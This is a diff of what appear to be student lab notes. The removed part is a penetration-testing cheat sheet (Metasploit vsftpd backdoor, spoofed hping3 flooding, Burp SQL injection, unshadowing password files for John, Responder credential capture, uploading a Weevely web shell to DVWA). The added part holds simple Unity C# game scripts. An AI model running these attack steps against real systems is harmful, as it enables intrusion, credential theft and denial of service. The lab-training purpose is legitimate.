@@ -1,106 +1,761 @@
-1.(a)
-nmap -sL <network>
-nmap -sn <network>
-nmap <ip_address>
-nmap -sV <ip_address>
-nmap -sC <ip_address> -p <port_number>
-ping <ip_address>
-nmap -sV <ip_address>
-searchsploit vsftpd 2.3.4
-In a new terminal execute, msfconsole
-search vsftpd
-use exploit/unix/ftp/vsftpd_234_backdoor
-show info
-show options
-set RHOSTS <ip_address>
-exploit
+1)
 
-1(b). hping
-sudo apt install hping3
-sudo hping3 -S <ip_address> -p <port> -c <number_of_packets> 
-sudo hping3 --traceroute -V -1 <ip_address> 
-sudo hping3 -a <FAKE IP> <target> -S -q -p 80 --faster     sudo hping3 -a 192.168.225.128 192.168.225.128 -S -q -p 80 --faster
+rotate.cs
 
-2(a)burp suite
-metasploitable -> cd /var/www/mutillidae -> sudo nano config.inc
-replace metasploitable by owasp10
-Kali
-Browser -> metasploitable ip -> mutillidae
-owasp10 -> A1 -> SQLi-extract data -> user info
-Browser -> preference -> network -> manual proxy -> 127.0.0.1:8080 -> enable ftp & https
-Burpsuit -> Proxy -> intercept on (if off)
-Browser -> mutillidae -> random credentials
-select all -> send to intruder
-Intruder -> positions -> clear -> select name -> add
-	 -> payloads -> load -> /usr/share/wordlist/wfuzz/injections/SQL.txt -> Start attack
-39
+using System.Collections;
 
-2(b) Httrack
-Httrack <url>
+using System.Collections.Generic;
 
-3(a) John the ripper
-unshadow /etc/passwd /etc/shadow > file.txt
-(Create a password file and run it with 'john' command)
-john --single --format=raw-sha1 file.txt
+using UnityEngine;
 
-3(b) Crunch
-crunch <min> <max> word
 
-4(a) Macchanger
-macchanger -s eth0     display n exit
-ifconfig eth0 down
-macchanger -r eth0     random
-ifconfig eth0 down
-macchanger -p eth0     changes to original
-macchanger -e eth0     ending bytes change 
-macchanger -m eth0     manually change MAC
 
-4(b) Responder
-responder -I eth0 
-Enter the IP address and enter the credentials(uname and pw)
-Go to /usr/share/responder/logs and copy the file name (HTTP......) 
-Run it with john to get the credentials
+public class rotate : MonoBehaviour
 
-5(a) Weevely
-weevely generate 12345 shell.php
-kali firefox-> enter metaspoilt ip
-click on dvwa, switch security to low and submit, "admin" and "password"
-go to upload n upload shell.php, copy the path from "hackable" and paste after dvwa/     hackable/uploads/shell.php
-copy the entire url and enter this in the terminal: weevely "paste url here" 12345
+{
 
-5(b) Proxychain
-cd /etc
-sudo nano "prox...4"
-remove dynamic (comment)
-comment strict chain
-go till the end and repeat the last line for socks5
--service tor restart
--proxychai..4 firefox google.com
+    public float moveSpeed;
 
-6(a) Foremost
-foremost -v -t jpg -i /dev/sda1 -o output
 
-6(b)
--binwalk -B ".exe"  content
--binwalk -e ".exe"  compressed file extraction
--binwalk -E ".exe" entropy graph, encryption
 
-7(a) Pipal
--create a txt file in pwd full of passwords
--run "pipal pass.txt" to get stats
--pipal -t 10 pass.txt
--pipal -o "filename" pass.txt
+    // Start is called before the first frame update
 
-7(b) Cutycapt
-cutycapt --url=https://www.rvce.edu.in --out=outt.png
+    void Start()
 
-8(a)Netdiscover
-sudo netdiscover -r "ip address"
-sudo netdiscover -m "ip address"  mac address
-sudo netdiscover -p "ip address"  passive mode
+    {
 
-8(b)pdf-parser
-pdf-parser -a "pdfname"
-pdf-parser -o "pdfname"
-pdf-parser -g "pdfname"
+        moveSpeed = 5f;
+
+    }
+
+
+
+    // Update is called once per frame
+
+    void Update()
+
+    {
+
+        transform.Rotate(1,0,0);
+
  
+
+    }
+
+}
+
+
+
+Or 
+
+
+
+using System.Collections;
+
+using System.Collections.Generic;
+
+using UnityEngine;
+
+using System;
+
+
+
+public class rotate : MonoBehaviour
+
+{
+
+    public float moveSpeed;
+
+
+
+    // Start is called before the first frame update
+
+    void Start()
+
+    {
+
+        moveSpeed = 500f;
+
+    }
+
+
+
+    // Update is called once per frame
+
+    void Update()
+
+    {
+
+        //Vector3.up is Vector3(0, 1, 0) rotate along Y axis
+
+        if (Input.GetKey(KeyCode.Z))
+
+            transform.Rotate(Vector3.up * moveSpeed * Time.deltaTime);
+
+
+
+        if (Input.GetKey(KeyCode.X))
+
+            transform.Rotate(-Vector3.up * moveSpeed * Time.deltaTime);
+
+    }
+
+}
+
+
+
+move.cs
+
+using System.Collections;
+
+using System.Collections.Generic;
+
+using UnityEngine;
+
+
+
+public class move : MonoBehaviour
+
+{
+
+    public float moveSpeed;
+
+
+
+    // Start is called before the first frame update
+
+    void Start()
+
+    {
+
+        moveSpeed = 5f;
+
+    }
+
+
+
+    // Update is called once per frame
+
+    void Update()
+
+    {
+
+        
+
+        transform.Translate(moveSpeed * Input.GetAxis("Horizontal") * Time.deltaTime, 0f, moveSpeed * Input.GetAxis("Vertical") * Time.deltaTime);
+
+    }
+
+}
+
+scale.cs
+
+using System.Collections;
+
+using System.Collections.Generic;
+
+using UnityEngine;
+
+
+
+public class scale : MonoBehaviour
+
+{
+
+    // Start is called before the first frame update
+
+    public float size=0.1f;
+
+    // public Vector3 scale change d
+
+    void Start()
+
+    {
+
+        
+
+    }
+
+
+
+    // Update is called once per frame
+
+    void Update()
+
+    {
+
+        if(Input.GetKey("e"))
+
+        transform.localScale+=new Vector3(size,0,0);
+
+        else if(Input.GetKey("d"))
+
+        transform.localScale-=new Vector3(size,0,0);
+
+        else if(Input.GetKey("r"))
+
+        transform.localScale+=new Vector3(0,size,0);
+
+        else if(Input.GetKey("f"))
+
+        transform.localScale-=new Vector3(0,size,0);
+
+        else if(Input.GetKey("t"))
+
+        transform.localScale+=new Vector3(0,0,size);
+
+        else if(Input.GetKey("g"))
+
+        transform.localScale-=new Vector3(0,0,size);
+
+    }
+
+}
+
+prgrm 2
+
+bounce.cs
+
+using System.Collections;
+
+using System.Collections.Generic;
+
+using UnityEngine;
+
+
+
+public class BallCollision : MonoBehaviour
+
+{
+
+    public float moveSpeed;
+
+    private Rigidbody rbody;
+
+    private Renderer rend; 
+
+    // Start is called before the first frame update
+
+    void Start()
+
+    {
+
+        moveSpeed = 15f;
+
+        rbody = GetComponent<Rigidbody>();
+
+        rend = GetComponent<Renderer>();
+
+    }
+
+
+
+    // Update is called once per frame
+
+    void Update()
+
+    {
+
+        float inputx = Input.GetAxis("Horizontal");
+
+        float inputz = Input.GetAxis("Vertical");
+
+        float movex = inputx * moveSpeed * Time.deltaTime;
+
+        float movez = inputz * moveSpeed * Time.deltaTime;
+
+        rbody.transform.Translate(-movex,0f,-movez);
+
+    }
+
+
+
+    private void OnCollisionEnter(Collision col) {
+
+        if(col.collider.name == "Front") {
+
+            rend.material.color = Color.green;
+
+        }
+
+        else if(col.collider.name == "Left" || col.collider.name == "Right") {
+
+            rend.material.color = Color.blue;
+
+        }
+
+        else if(col.collider.name == "Top" || col.collider.name == "Bottom") {
+
+            rend.material.color = Color.red;
+
+        }
+
+    }
+
+}
+
+
+
+Or 
+
+
+
+using System.Collections;
+
+using System.Collections.Generic;
+
+using UnityEngine;
+
+
+
+public class bounce_2 : MonoBehaviour
+
+{
+
+    public float moveSpeed = 100f;
+
+    private Rigidbody rbody;
+
+    private Renderer rend;
+
+    // Start is called before the first frame update
+
+    void Start()
+
+    {
+
+        rbody = GetComponent<Rigidbody>();
+
+        rend = GetComponent<Renderer>();
+
+    }
+
+
+
+    // Update is called once per frame
+
+    void Update()
+
+    {
+
+        float inputX = Input.GetAxis("Horizontal");
+
+        float inputZ = Input.GetAxis("Vertical");
+
+        float moveX = inputX * moveSpeed * Time.deltaTime;
+
+        float moveZ = inputZ * moveSpeed * Time.deltaTime;
+
+        rbody.AddForce(moveX, 0f, moveZ,ForceMode.Impulse);
+
+    }
+
+    private void OnCollisionEnter(Collision col)
+
+    {
+
+        if (col.collider.name == "5")
+
+        {
+
+            rend.material.color = Color.blue;
+
+        }
+
+        else if (col.collider.name == "2")
+
+        {
+
+            rend.material.color = Color.green;
+
+        }
+
+        else if (col.collider.name == "3")
+
+        {
+
+            rend.material.color = Color.red;
+
+        }
+
+        else if (col.collider.name == "4")
+
+        {
+
+            rend.material.color = Color.yellow;
+
+        }
+
+    }
+
+}
+
+
+
+
+
+
+
+3)
+
+bounce.cs
+
+using System.Collections;
+
+using System.Collections.Generic;
+
+using UnityEngine;
+
+
+
+public class bounce : MonoBehaviour
+
+{
+
+    // Start is called before the first frame update
+
+    public float force =600f;
+
+    void Start()
+
+    {
+
+       GetComponent<Rigidbody>().velocity=new Vector3(5,5,0);
+
+    }
+
+
+
+}
+
+Or
+
+
+
+Bounce randomness.cs
+
+using System.Collections;
+
+using System.Collections.Generic;
+
+using UnityEngine;
+
+
+
+public class ballbounce : MonoBehaviour
+
+{
+
+    // Start is called before the first frame update
+
+    //Built in X and Z axis
+
+    void Start()
+
+    {
+
+        GetComponent<Rigidbody>().velocity=new Vector3(2f, 0,3f);
+
+    }
+
+    void OnCollisionEnter(Collision col)
+
+    {
+
+        if (col.collider.name == "down")
+
+        {
+
+            GetComponent<Rigidbody>().AddForce(Random.Range(-1f, 1f)*5, 0f, Random.Range(-1f, 1f) * 5,ForceMode.Impulse);
+
+        }
+
+        if (col.collider.name == "up")
+
+        {
+
+            GetComponent<Rigidbody>().AddForce(Random.Range(-1f, 1f)*5, 0f, Random.Range(-1f, -0.5f) * 5,ForceMode.Impulse);
+
+        }
+
+        
+
+    }
+
+}
+
+
+
+paddle.cs
+
+using System.Collections;
+
+using System.Collections.Generic;
+
+using UnityEngine;
+
+
+
+public class paddle : MonoBehaviour
+
+{
+
+    public float moveSpeed;
+
+
+
+    // Start is called before the first frame update
+
+    void Start()
+
+    {
+
+        moveSpeed = 5f;
+
+    }
+
+
+
+    // Update is called once per frame
+
+    void Update()
+
+    {
+
+        transform.Translate(moveSpeed * Input.GetAxis("Horizontal") * Time.deltaTime, 0f, 0f);
+
+    }
+
+}
+
+4th(lowlypoly,free trees)
+
+move.cs
+
+using System.Collections;
+
+using System.Collections.Generic;
+
+using UnityEngine;
+
+
+
+public class move_4 : MonoBehaviour
+
+{
+
+    // Start is called before the first frame update
+
+    public float movespeed;
+
+    void Start()
+
+    {
+
+        movespeed = 5f;
+
+    }
+
+
+
+    // Update is called once per frame
+
+    void Update()
+
+    {
+
+        transform.Translate(0f, 0f, movespeed * Time.deltaTime * Input.GetAxis("Vertical"));
+
+        transform.Rotate(0f, movespeed * Time.deltaTime * Input.GetAxis("Horizontal"), 0f);
+
+    }
+
+}
+
+
+
+
+
+6th
+
+appear
+
+using System.Collections;
+
+using System.Collections.Generic;
+
+using UnityEngine;
+
+
+
+public class appear : MonoBehaviour
+
+{
+
+    public GameObject car;
+
+    public GameObject bus;
+
+
+
+    void start()
+
+    {
+
+        bus.SetActive(false);
+
+        car.SetActive(false);
+
+    }
+
+
+
+    public void openBus()
+
+    {
+
+        bus.SetActive(true);
+
+        car.SetActive(false);
+
+    }
+
+    public void openCar()
+
+    {
+
+        car.SetActive(true);
+
+        bus.SetActive(false);
+
+    }
+
+}
+
+7th
+
+light.cs
+
+
+
+using UnityEngine;
+
+
+
+public class color : MonoBehaviour
+
+{
+
+    // Start is called before the first frame update
+
+    public Renderer rend;
+
+    public Light lightComp;
+
+    public Color[] colors = new Color[] { new Color(0,1,0,1), new Color(1,0,0,1), new Color(1,1,1,1), new Color(0,0,1,1) };
+
+    public int index = 0;
+
+    void Start()
+
+    {
+
+        Debug.Log(Color.blue);
+
+        rend = gameObject.GetComponent<Renderer>();
+
+        lightComp = GetComponent<Light>();
+
+        
+
+    }
+
+
+
+    // Update is called once per frame
+
+    void Update()
+
+    {
+
+        if (Input.GetKey(KeyCode.Tab) || Input.GetKey(KeyCode.Mouse0))
+
+        {
+
+            index = (index + 1) % 4; 
+
+            lightComp.color = colors[index];
+
+            rend.material.color = colors[index];
+
+        }
+
+    }
+
+}
+
+10th
+
+sound.cs
+
+using System.Collections;
+
+using System.Collections.Generic;
+
+using UnityEngine;
+
+
+
+public class buttoncontrol : MonoBehaviour
+
+{
+
+    // Start is called before the first frame update
+
+    public AudioSource horn,desc;
+
+    void Start()
+
+    {
+
+      
+
+    }
+
+
+
+    // Update is called once per frame
+
+    void Update()
+
+    {
+
+        
+
+    }
+
+    public void horning()
+
+    {
+
+        
+
+        horn.Play();
+
+    }
+
+    public void describing()
+
+    {
+
+      
+
+        desc.Play();
+
+    }
+
+
+
+
+
+}
